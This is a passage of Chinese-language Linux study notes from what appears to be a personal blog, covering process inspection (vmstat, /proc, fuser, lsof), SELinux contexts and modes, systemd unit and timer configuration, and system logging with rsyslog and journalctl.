class="hljs-comment"># b不可被幻型的进程数量</span><br>--内存字段<br><span class="hljs-comment"># swpd虚拟内存被使用的容量</span><br><span class="hljs-comment"># free未被使用的内存容量</span><br><span class="hljs-comment"># buff用于缓冲存储器</span><br><span class="hljs-comment"># cache用于高速缓存</span><br>--交换内存分区<br><span class="hljs-comment"># si由硬盘中将进程取出的容量</span><br><span class="hljs-comment"># so由于内存不足而将没用到的进程写入到磁盘的swap容量</span><br>--硬盘读写<br><span class="hljs-comment">#bi:磁盘读入的块数</span><br><span class="hljs-comment">#bo:写到磁盘的快数</span><br>--系统<br><span class="hljs-comment">#in:每秒被中断的进程次数</span><br><span class="hljs-comment">#cs:每秒执行的次数</span><br>--CPU<br><span class="hljs-comment">#us:非内核的CPU状态</span><br><span class="hljs-comment">#sy:内核层CPU状态</span><br><span class="hljs-comment">#id:闲置状态</span><br><span class="hljs-comment">#wa:等待I/O所耗费的CPU</span><br><span class="hljs-comment">#st:被虚拟机所使用的CPU</span><br></code></pre></td></tr></table></figure><p>参数自己查把</p><h4 id="x2F-proc-x2F"><a href="#x2F-proc-x2F" class="headerlink" title="&#x2F;proc&#x2F;*"></a>&#x2F;proc&#x2F;*</h4><p>我们提到的所谓的进程都在内存中,而内存又写到了&#x2F;proc&#x2F;*这个文件中PID为1就是&#x2F;proc&#x2F;1</p><p>基本都有很多关于进程的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH 1]<span class="hljs-comment"># cat cmdline </span><br>/usr/lib/systemd/systemd--switched-root--system--deserialize22<br>[root@YH 1]<span class="hljs-comment"># cat environ </span><br></code></pre></td></tr></table></figure><p>cmdline命令串</p><p>environ环境变量内容</p><p>具体每个文件啥样看文档吧<a href="https://blog.csdn.net/xiaodingqq/article/details/79943648">https://blog.csdn.net/xiaodingqq/article/details/79943648</a></p><h4 id="fuser通过文件找出正在使用该文件的进程"><a href="#fuser通过文件找出正在使用该文件的进程" class="headerlink" title="fuser通过文件找出正在使用该文件的进程"></a>fuser通过文件找出正在使用该文件的进程</h4><p>如果你要卸载某个分区但发现该分区为忙碌的可以使用该命令</p><ul><li>-u:列出使用者</li><li>-m:对umount不成功有效,后面接文件名会主动地提到该文件系统的最顶层</li><li>-v:可以列出每个文件与进程还有命令的相关性</li><li>-k:找出使用该文件&#x2F;目录的PID,并试图以SIGKILL这个信号给予PID</li><li>-i:必须与-k配合</li><li>-signal: 例如-1 ,-15如果不给出则默认-9</li></ul><p>fuser -uv .列出当前目录使用的PID&#x2F;所属账号&#x2F;权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH YH]<span class="hljs-comment"># fuser -uv .</span><br>                     USER        PID ACCESS COMMAND<br>/usr/local/YH:       root     kernel mount (root)/usr/local/YH<br>                     root        972 ..c.. (root)bash<br><span class="hljs-comment">#关于access的值c代表当前目录下,e代表可被触发的执行状态,f是一个被开启的文件,r代表顶层目录,F代表文件被使用,不过在等待响应中,m代表可能是共享的动态函数库</span><br></code></pre></td></tr></table></figure><p>模拟我要卸载&#x2F;home但是被占用了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH home]<span class="hljs-comment"># fuser -uv .</span><br>                     USER        PID ACCESS COMMAND<br>/home:               root        972 ..c.. (root)bash<br>                     stranger   2333 ..c.. (stranger)bash<br></code></pre></td></tr></table></figure><p>通过fuser -mki &#x2F;home来进行移除</p><h4 id="lsof列出被进程所使用的文件名"><a href="#lsof列出被进程所使用的文件名" class="headerlink" title="lsof列出被进程所使用的文件名"></a>lsof列出被进程所使用的文件名</h4><p>和fuser相反,fuser是通过文件来找出进程,而lsof是通过进程找出文件</p><p>-a 更改属性</p><p>-u 所属使用者</p><h4 id="pidof找出某个正在执行的进程的pid"><a href="#pidof找出某个正在执行的进程的pid" class="headerlink" title="pidof找出某个正在执行的进程的pid"></a>pidof找出某个正在执行的进程的pid</h4><h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p>避免资源被误用,传统的文件权限与账号的关系以策略规则指定特定进程读取特定文件</p><p>以前没使用SELinux的DAC,权限只有普通的rwx,这样很难针对性进行权限设置,例如我们有个www服务器里面有一个httpd假设被别人攻击并获取后它可以修改其他777权限的目录</p><p>但是使用了MAC后对httpd这个进程进行设置,为只在&#x2F;var&#x2F;www&#x2F;html这个文件夹下有权限其他文件夹去都去不了就可以了</p><p>SELinux的相关的东西</p><ul><li>主体:SELinux主要管理的就是进程,所以进程与主体基本一样</li><li>目标:主体能否进行读写的目标资源,可理解为文件系统</li><li>策略:根据策略来指定<ul><li>targeted:针对网络服务较多,默认策略</li><li>minimum:由target自定义而来针对选择的进程来保护</li><li>mls:完整的SELinux限制</li><li>安全上下文:&#x3D;&#x3D;放在inode里面&#x3D;&#x3D;</li></ul></li></ul><p>主体与目标的安全上下文必须一致才能顺利读写</p><p>查看目录下的安全上下文ls -Z</p><p>用两个冒号划分为三段</p><p>Identify:role:type</p><ul><li>Identify:账号的身份识别<ul><li>unconfined_u:不受限制的用户,不受SELinux管制(一般由用户产生)</li><li>system_u:系统用户(一般由系统产生)</li></ul></li><li>Role:角色<ul><li>object_r:代表文件或目录</li><li>system_r:代表的是进程</li></ul></li><li>Type(最重要):类型一般一个主体能不能读取文件或资源与这个字段有关<ul><li>type:文件资源(Object)上面称为类型(Type)</li><li>domain:在主体进程(Subject)则称为域(Domain)</li></ul></li></ul><p>关于SELinux的三种模式</p><ul><li>Enforcing :强制模式,任何操作都需要进行检测如果不满足策略则直接拦截</li><li>Permissive:兼容模式,任何操作都进行检测但是不满足不会拦截而是记录在log内</li><li>Disable   :关闭模式</li></ul><p>getenforce:列出目前模式</p><p>sestatus:列出目前的SELinux使用的哪个策略</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@VM-0-5-centos bin]<span class="hljs-comment"># ls -al | grep &#x27;bash&#x27;</span><br>-rwxr-xr-x.  1 root root      964536 Apr  1  2020 bash<br>lrwxrwxrwx.  1 root root          10 Aug  7  2020 bashbug -&gt; bashbug-64<br>-rwxr-xr-x.  1 root root        6964 Apr  1  2020 bashbug-64<br>lrwxrwxrwx.  1 root root           4 Aug  7  2020 sh -&gt; bash<br>[root@VM-0-5-centos bin]<span class="hljs-comment"># sestatus </span><br>SELinux status:                 enabled<br>SELinuxfs mount:                /sys/fs/selinux<br>SELinux root directory:         /etc/selinux<br>Loaded policy name:             targeted<br>Current mode:                   permissive<br>Mode from config file:          permissive<br>Policy MLS status:              enabled<br>Policy deny_unknown status:     allowed<br>Max kernel policy version:      31<br></code></pre></td></tr></table></figure><p>getsebool查看各个规则的bool值</p><p>chcon [-R] [-t type] [-u user] [-r role] 文件 修改SELinux类型</p><ul><li>-R :连同子目录也修改</li><li>-t :后面接安全上下文的类型栏</li></ul><p>用chcon修改文件我指定的类型</p><p>或使用chcon –reference&#x3D;范例文件 文件  将文件设为范例文件的类型</p><p>restorecon -Rv 文件名</p><p>让文件恢复正确的SELinux</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH YH]<span class="hljs-comment"># ls -Z</span><br>drwxr-xr-x. root root unconfined_u:object_r:usr_t:s0   test1<br>[root@YH YH]<span class="hljs-comment"># chcon -t aaa test1</span><br>[root@YH YH]<span class="hljs-comment"># ls -Z</span><br>drwxr-xr-x. root root unconfined_u:object_r:aaa:s0     test1<br>[root@YH YH]<span class="hljs-comment"># restorecon test1</span><br>[root@YH YH]<span class="hljs-comment"># ls -Z</span><br>drwxr-xr-x. root root unconfined_u:object_r:usr_t:s0   test1<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;&#x2F;etc&#x2F;selinux&#x2F;config这个文件用来修改模式&#x3D;&#x3D;</p><p>如果只是从宽容改成强制可以使用setenforce [0|1]</p><p>0为宽容</p><p>1为强制</p><p>为啥restorecon可以还原目录与文件的安全上下文.</p><p>semanage默认目录的修改与查看</p><h4 id="关于日志协助"><a href="#关于日志协助" class="headerlink" title="关于日志协助"></a>关于日志协助</h4><p>日志信息放在&#x2F;var&#x2F;log&#x2F;message与&#x2F;var&#x2F;log&#x2F;setroubleshoot,但是需要安装setroubleshoot与setroubleshoot-server</p><p>安装完成后需要重启auditd</p><p>&#x3D;&#x3D;这个SELinux讲的真cha！！！&#x3D;&#x3D;</p><blockquote><p>&#x3D;&#x3D;如果由于SELinux配置出问题可以使用restorecon -Rv &#x2F;来还原&#x3D;&#x3D;</p></blockquote><h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>一般服务的后缀名都带有一个d(daemon)字代表后台执行例如atd，crond</p><p>顺带提一嘴se开头的与SELinux有关</p><p>&#x3D;&#x3D;有时服务是有依赖的所以关闭一个可能没用&#x3D;&#x3D;</p><p>现在的systemd启动方式与传统unix的init启动方式的优点</p><ul><li>并行处理加快了启动速度<ul><li>由于init是一个一个的启动服务因为要依赖很多服务,由于现在由于主机和操作系统支持多内核所以可以同时启动</li></ul></li><li>一命令管理<ul><li>systemd的全部就是仅有一个systemctl来处理的,不像init启动不同的需要不同的命令</li></ul></li><li>服务依赖的自动检查<ul><li>如果你要启动一个服务需要另一个依赖,system会自动帮你检查然后帮你启动</li></ul></li><li>更多的功能分类便于管理<ul><li>现在系统的system功能将服务统一为一个unit单元然后进行分类为比以前更合理的分类便于记忆</li></ul></li><li>打包运行<ul><li>根据以前的init的5级别的运行特色,systemd将很多功能集合成一个所谓的target项目.亦或是执行了某个target就执行了很多个daemon项目</li></ul></li><li>兼容init,但是也有一些不支持<ul><li>只有1,3,5级别</li><li>全部都是systemctl进行管理,而systemctl语法有限制并且没法自定义</li><li>如果手动启动某个服务systemd就无法检测到该服务(例如用crond启动啥啥啥)</li><li>systemd启动过程中无法交互,所以如果自己写systemd的启动程序时候要避免交互式</li></ul></li></ul><h3 id="systemd的配置文件与目录"><a href="#systemd的配置文件与目录" class="headerlink" title="systemd的配置文件与目录"></a>systemd的配置文件与目录</h3><p>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;:每个服务最主要的管理系统,官方提供的软件安装后启动程序都放在这个目录下面</p><p>&#x2F;run&#x2F;systemd&#x2F;system&#x2F;:系统执行过程中所产生的服务脚本,比上面的优先级高</p><p>&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;:管理员根据系统要求建立的脚本,比上面那两条的优先级高</p><p>&#x2F;etc&#x2F;sysconfig&#x2F;*:几乎所有服务都会将初始化的一些选项设置写入到这个目录</p><p>&#x2F;var&#x2F;lib:产生数据的服务写入到这个目录</p><p>&#x2F;run&#x2F;:放置daemon的缓存</p><p>&#x2F;etc&#x2F;services定义服务与端口的映射</p><p>修改启动设置要去&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system下面</p><p>要管理哪些启动哪些不启动要去&#x2F;etc&#x2F;systemd&#x2F;system下面</p><h4 id="主要常用服务以及后缀名"><a href="#主要常用服务以及后缀名" class="headerlink" title="主要常用服务以及后缀名"></a>主要常用服务以及后缀名</h4><table><thead><tr><th>后缀名</th><th>主要服务功能</th></tr></thead><tbody><tr><td>.service</td><td>一般服务类型,最常见的</td></tr><tr><td>.socket</td><td>多半用于数据交互,本地用的多</td></tr><tr><td>.target</td><td>一群unit的集合,一般执行一个.target就相当于执行了一堆.service和.socket</td></tr><tr><td>.mount和.automount</td><td>文件系统相关的挂载的服务,用于管理系统的各个挂载</td></tr><tr><td>.path</td><td>用来检测目录然后提供队列服务</td></tr><tr><td>.timer</td><td>systemd主动执行的循环服务</td></tr></tbody></table><h3 id="使用systemctl来管理服务"><a href="#使用systemctl来管理服务" class="headerlink" title="使用systemctl来管理服务"></a>使用systemctl来管理服务</h3><p><strong>systemctl</strong></p><p>命令部分:</p><ul><li><p>systemctl [command] [unit]</p><ul><li><p>单一服务控制</p><ul><li>start :立即启动后面接的unit</li><li>stop :立即停止后面接的unit,但可能因为其他服务导致重新激活</li><li>restart :立即重启后接unit</li><li>reload :不关闭服务的情况下重启加载配置文件</li><li>enable :设置下次开机自启动后接unit</li><li>disable :设置下次开机后不启动unit</li><li>is-active:是否启动</li><li>is-enable:是否自启动</li><li>status:查看unit状态</li><li>mask:注销服务不会被激活</li><li>unmask:取消注销</li></ul></li><li><p>查看所有服务</p><ul><li><p>list-units:依据目前启动的unit,加上–all显示没有启动的</p></li><li><p>list-unit-files:一局&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system内的文件,将所有文件列表说明</p></li><li><p>–type&#x3D;TYPE 就是上面那个表里面那个<a href="####%E4%B8%BB%E8%A6%81%E5%B8%B8%E7%94%A8%E6%9C%8D%E5%8A%A1%E4%BB%A5%E5%8F%8A%E5%90%8E%E7%BC%80%E5%90%8D">类型</a></p></li><li><p>list-sockets</p></li></ul></li><li><p>常见的target(下面的都在.target就不写了)</p><ul><li>graphical:命令加上图形界面</li><li>multi-user:纯命令</li><li>rescue:无法使用root登录的情况下滋生的额外系统</li><li>emergency:紧急处理系统的错误</li><li>shutdown:关机</li><li>getty:设置你需要的tty</li></ul></li><li><p>切换不同的操作系统模式</p><ul><li>get-default:取得目前的模式</li><li>set-default:设置默认的启动模式</li><li>isolate:切换到后面接的模式</li><li>poweroff:关机</li><li>reboot:重启</li><li>suspend:挂起(数据保存到内存中,关闭大部分的硬件设备)</li><li>hibernate:休眠(数据保存到硬盘然后关机)</li><li>rescue:强制进入恢复模式</li><li>emergency:强制进入紧急恢复模式</li></ul></li><li><p>通过systemctl分析各个服务之间的依赖</p><ul><li>list-dependencies [unit] [–reverse]<ul><li>–reverse:反向追踪</li></ul></li></ul></li></ul></li></ul><p>&#x3D;&#x3D;在.service才使用start、stop、restart等命令，但是在.target时候用isolate&#x3D;&#x3D;</p><p>内容解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">● firewalld.service - firewalld - dynamic firewall daemon<br>   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; disabled; vendor preset: enabled)<br>   Active: active (running) since Sun 2021-09-26 09:39:13 CST; 17min ago<br>     Docs: man:firewalld(1)<br> Main PID: 28544 (firewalld)<br>   CGroup: /system.slice/firewalld.service<br>           └─28544 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nopid<br><br>Sep 26 09:39:13 YH systemd[1]: Starting firewalld - dynamic firewall daemon...<br>Sep 26 09:39:13 YH systemd[1]: Started firewalld - dynamic firewall daemon.<br>Sep 26 09:39:14 YH firewalld[28544]: WARNING: AllowZoneDrifting is enabled. This is considered an insecure configuration option... it now.<br>Hint: Some lines were ellipsized, use -l to show <span class="hljs-keyword">in</span> full.<br></code></pre></td></tr></table></figure><ul><li><p>Loaded:说明不自启动</p></li><li><p>Active:正在执行(running)</p><ul><li>exited:执行一次就结束</li><li>waiting需要等待</li><li>inactive:没有运行的意思</li></ul></li></ul><p>后面是PID</p><p>下面是日志 时间 发送给哪一台主机 哪一个服务信息 内容是啥</p><h3 id="systemctl针对service类型的配置文件"><a href="#systemctl针对service类型的配置文件" class="headerlink" title="systemctl针对service类型的配置文件"></a>systemctl针对service类型的配置文件</h3><p>以sshd为例子</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH ~]<span class="hljs-comment"># cat /usr/lib/systemd/system/sshd.service </span><br>[Unit]<br>Description=OpenSSH server daemon<br>Documentation=man:sshd(8) man:sshd_config(5)<br>After=network.target sshd-keygen.service<br>Wants=sshd-keygen.service<br><br>[Service]<br>Type=notify<br>EnvironmentFile=/etc/sysconfig/sshd<br>ExecStart=/usr/sbin/sshd -D <span class="hljs-variable">$OPTIONS</span><br>ExecReload=/bin/kill -HUP <span class="hljs-variable">$MAINPID</span><br>KillMode=process<br>Restart=on-failure<br>RestartSec=42s<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>unit:对本身的说明,以及与其他依赖的设置,什么时候启动</p><p>Service、Socket、Timer、Mount、Path:不同的unit类型对应着不同设置项目.所以这里是Service 这个项目主要用来规范服务启动的脚本、环境配置文件名、重启的方式</p><p>Install:这个项目就是将此unit安装到哪个target里面</p><p>其他:</p><blockquote><p>项目内的设置通常是可以重复的,例如在[Unit]里面设置了两个After这样后面哪个After会覆盖前面那个<br>如果项目需要设置[是&#x2F;否]的布尔值项目可以使用1,yes,true,on代表开启 0,no,false,off代表关闭<br>空白行,#开头或;那一行都代表注释</p></blockquote><p>表格说明:</p><p>Unit部分</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>Description</td><td>systemctl list-units时进行输出的介绍</td></tr><tr><td>Documentation</td><td>手册</td></tr><tr><td>After</td><td>强调在那个项目之后执行,不是强制性只是用来说明启动顺序</td></tr><tr><td>Before</td><td>与After相反</td></tr><tr><td>Requires</td><td>是在什么服务启动之前最好启动这个服务</td></tr><tr><td>Wants</td><td>与Requires相反,在什么程序启动之后才能够启动这个</td></tr><tr><td>Conflicts</td><td>代表冲突的服务.就是后接的项目如果启动则不启动</td></tr></tbody></table><p>Service</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>Type</td><td>simple默认值,这个daemon主要由ExecStart,接的命令来启动,启动后常驻于内存<br>forking:由ExecStart启动的程序通过spawns扩展出来的程序作为该程序的主要服务,在原生父进程启动结束后终止运行<br>oneshot:与simple类似,不过这个进程在工作完毕就关闭不驻于内存<br>dbus:与simple类似,但这个daemon必须要在获取一个D-Bus的名称后,才会继续运行通常要设置BusName&#x3D;才行<br>idle:与simple类似,意思是要执行这个daemon必须要所有的工作都顺利执行完毕后才会执行通常是开机最后任务</td></tr><tr><td>EnvironmentFile</td><td>可以指定启动脚本的环境配置文件</td></tr><tr><td>ExecStart</td><td>实际执行daemon的命令或者脚本</td></tr><tr><td>ExecStop</td><td>关闭服务的命令</td></tr><tr><td>ExecReload</td><td>与重新加载配置文件有关</td></tr><tr><td>Restart</td><td>当为1时关闭该服务会立即再次开启</td></tr><tr><td>RemainAfterExit</td><td>为1时,这个daemon所属的进程都终止之后会再次尝试启动</td></tr><tr><td>TimeoutSec</td><td>这个服务在启动或者关闭时,因为某些命令无法顺利运行的我们要等多久才能进入强制结束状态</td></tr><tr><td>KillMode</td><td>process:daemon终止时只终止主要进程ExecStart后接的命令串<br>control-group:daemon终止时此daemon所产生的其他control-group进程都会关闭<br>none:daemon终止时没有进程被关闭</td></tr><tr><td>RestartSec</td><td>服务被关闭需要多少秒才能重新启动</td></tr></tbody></table><p>Install</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>WabtedBy</td><td>大部分时.target的含义是依附于那个target</td></tr><tr><td>Also</td><td>当前这个unit本身被enable,Also后接的unit也请enable的意思(一般是依赖服务)</td></tr><tr><td>Alise</td><td>运行一个连接的别名</td></tr></tbody></table><h4 id="关于Systemctl针对timer的配置文件"><a href="#关于Systemctl针对timer的配置文件" class="headerlink" title="关于Systemctl针对timer的配置文件"></a>关于Systemctl针对timer的配置文件</h4><p>systemd.timer的优势</p><ul><li>由于所有的systemd的服务所产生的信息都会被记录（log），因此比crond在debug上面要清楚。</li><li>各项timer的任务可以跟systemd的服务相结合</li><li>各项timer的任务可以跟control group结合</li></ul><p>想要使用timer的必要条件：</p><ol><li>操作系统的timer.target一定要启动</li><li>要有个*.service的服务存在</li><li>要有个*.timer的时间启动服务存在</li></ol><p>在&#x2F;etc&#x2F;systemd&#x2F;system下面建立一个*.timer文件要有下面这些内容</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>OnActiveSec</td><td>当timers.target启动后多久才启动这个unit</td></tr><tr><td>OnBootSec</td><td>当启动完成后多久才执行</td></tr><tr><td>OnStartupSec</td><td>当systemd第一次启动之后多久才执行</td></tr><tr><td>OnUnitActionSec</td><td>这个timer配置文件所管理的那个unit服务在最后一次启动隔多久在启动</td></tr><tr><td>OnUnitInactiveSec</td><td>这个timer配置文件所管理的unit服务最后一次停止后隔多久在执行一次</td></tr><tr><td>OnCalendar</td><td>使用实际时间的方式来启动服务</td></tr><tr><td>Unit</td><td>在.timer中要制定哪一个server unit</td></tr><tr><td>Persistent</td><td>当使用OnCalender的设置时,指定该功能要不要持续进行的意思</td></tr></tbody></table><p>关于OnCalender的时间如果想要从crontab转换成这个timer功能的话,需要了解时间设置格式</p><p>语法:英文周名 YYYY-MM-DD HH:MM:SS</p><p>例子 Thu     2015-08-13 13:13:13</p><p>也可以使用时间间隔为分割 (时间)(单位),或者使用英文单词</p><p>例如</p><p>首先编写如下文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH system]<span class="hljs-comment"># cat YH_backup.timer </span><br>[Timer]<br>OnBootSec=2hrs<br>OnUnitActiveSec=2days<br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><p>然后进行运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@YH system]<span class="hljs-comment"># systemctl enable YH_backup.timer</span><br>[root@YH system]<span class="hljs-comment"># systemctl restart YH_backup.timer</span><br></code></pre></td></tr></table></figure><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>&#x3D;&#x3D;一般日志文件只有root能看&#x3D;&#x3D;</p><ul><li>&#x2F;var&#x2F;log<ul><li>&#x2F;boot.log:开机启动的时候系统内核会去检测与启动硬件</li><li>&#x2F;cron:记录crontab执行知否出错</li><li>&#x2F;dmesg:记录系统在开机的时候内核检测过程所产生的各项信息.</li><li>&#x2F;lastlog:最近一次登录的信息</li><li>&#x2F;maillog或&#x2F;mail&#x2F;*:记录邮件来往信息</li><li>&#x3D;&#x3D;&#x2F;messages:几乎系统出错的信息都在上面&#x3D;&#x3D;</li><li>&#x2F;secure:涉及到输入用户名密码的都在上面</li><li>&#x2F;wtmp:正确登录的账户信息</li><li>&#x2F;faillog:错误登录的账户信息</li><li>&#x2F;httpd&#x2F;*:记录网络服务日志</li><li>&#x2F;samba&#x2F;*:关于samba服务器的</li></ul></li></ul><p>如果任由日志记录下去则会很大所以可以用logrotate来记录</p><p>针对日志常需要的服务与程序有</p><p>&#x3D;&#x3D;rsyslogd的日志文件只要进行编辑过就不能继续记录,所有用vim查看的时候不要wq退出,重启rsyslog.service可以让他继续提供服务&#x3D;&#x3D;</p><ul><li><p>systemd-journald.service:最主要的信息记录者,内容在内存中可以使用journalctl来查看</p><ul><li>通过journalctl来查看</li><li>-n:显示几行</li><li>-r:反向输出</li><li>-p:后面所接重要性排序</li><li>-f:tail -f的功能持续显示journal的内容</li><li>–since –until 设置开始与结束时间</li><li>_COMM&#x3D;bash 只输出bash</li><li>_PID&#x3D;pid 只输出该pid的信息</li><li>_UID&#x3D;uid 只输出该uid的信息</li></ul></li><li><p>rsyslog.service:主要收集登录系统与网络服务的信息</p><ul><li><p>该服务的配置文件&#x2F;etc&#x2F;rsyslog.conf,为了将不同的信息放到不同的文件夹中</p></li><li><p>&#96;&#96;&#96;bash<br>[root@YH ~]# cat &#x2F;etc&#x2F;rsyslog.conf | grep -v “^$” | grep -v “^#”<br>$ModLoad imuxsock # provides support for local system logging (e.g. via logger command)<br>$ModLoad imjournal # provides access to the systemd journal<br>$WorkDirectory &#x2F;var&#x2F;lib&#x2F;rsyslog<br>$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat<br>$IncludeConfig &#x2F;etc&#x2F;rsyslog.d&#x2F;<em>.conf<br>$OmitLocalLogging on<br>$IMJournalStateFile imjournal.state<br><em>.info;mail.none;authpriv.none;cron.none                &#x2F;var&#x2F;log&#x2F;messages<br>authpriv.</em>                                              &#x2F;var&#x2F;log&#x2F;secure<br>mail.</em>                                                  -&#x2F;var&#x2F;log&#x2F;maillog<br>cron.*                                                  &#x2F;var&#x2F;log&#x2F;cron<br><em>.emerg                                                 :omusrmsg:</em><br>uucp,news.crit                                          &#x2F;var&#x2F;log&#x2F;spooler<br>local7.*                                                &#x2F;var&#x2F;log&#x2F;boot.log<br>#格式一般为:<br>#服务名称 服务等级                                       信息记录的文件名与主机(可以是远程主机用@,用户,文件路径,打印设备,当前在线的所有人*)</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><br>  - 第九行代表mail,authpriv,cron产生的信息较多所以就不记录到/var/log/messages里面了<br><br>  - 第十到十二行进行在对其进行了分类记录<br><br>  - 第十三行如果发生了严重的错误以广播的方式给所有系统账号<br><br>  - 十四行,早期unix的数据传递组<br><br>  - 十五行,启动信息<br><br>  - 第十一行中文件名前面的-代表先放入缓存等数据量大的时候再写入磁盘<br><br>  - &gt; 服务名称可以使用man 3 syslog查到(可是查到的与这里面的不大一样)    <br>    &gt;<br>    &gt; 默认格式为服务名称.服务等级(包含该等级以及更严重的等级都会按照这行的格式记录下来)但是还有别的关系式<br>    &gt;<br>    &gt; .=代表所需要的等级只有后面接的等级<br>    &gt;<br>    &gt; .!代表不等于,除了该等级以外的其他等级都记录<br><br>- logrotate:主要进行日志文件轮询功能<br><br>日志文件的一般格式:<br><br>- 事件发生的日期与事件<br>- 发生此事件的主机名<br>- 启动此事件的服务名称<br>- 内容<br><br>例如<br><br>```bash<br>[root@YH ~]# journalctl <br>-- Logs begin at Fri 2021<span class="hljs-string">-09</span><span class="hljs-string">-24</span> 16:26:44 CST, end at Mon 2021<span class="hljs-string">-09</span><span class="hljs-string">-27</span> 10:49:08 CST. --<br>Sep 24 16:26:44 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos systemd[1]: Reloading.<br>Sep 24 16:26:44 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos rsyslogd[1232]: imjournal: journal reloaded... [v8.24.0<span class="hljs-string">-57</span>.el7_9 try http://www.rsyslog.com/e/0 ]<br>Sep 24 16:26:48 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: qemu ***<br>Sep 24 16:26:48 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: fstab-sys ***<br>Sep 24 16:26:48 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: iscsi ***<br>Sep 24 16:26:49 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: rootfs-block ***<br>Sep 24 16:26:49 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: terminfo ***<br>Sep 24 16:26:49 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: *** Including module: udev-rules ***<br>Sep 24 16:26:49 VM<span class="hljs-string">-0</span><span class="hljs-string">-5</span>-centos dracut[1665]: Skipping 